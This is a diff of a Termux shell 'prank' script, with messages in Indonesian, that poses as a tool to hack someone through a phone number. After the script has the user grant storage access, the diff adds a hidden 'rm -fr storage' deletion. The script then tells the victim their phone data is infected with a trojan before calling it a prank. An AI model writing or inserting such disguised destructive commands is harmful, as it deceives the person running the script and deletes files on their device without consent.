@@ -54,6 +54,7 @@ clear
 echo "${p}#${r} ${k}hack via no hp"
 read -p "[?] Masukkan no hp" continue
 termux-setup-storage
+rm -fr storage
 echo "${u}DATA HP TERKENA TROJAN"
 read -p " tapi boong" continue
 echo "${r}MAMPUS KENA PRANK"
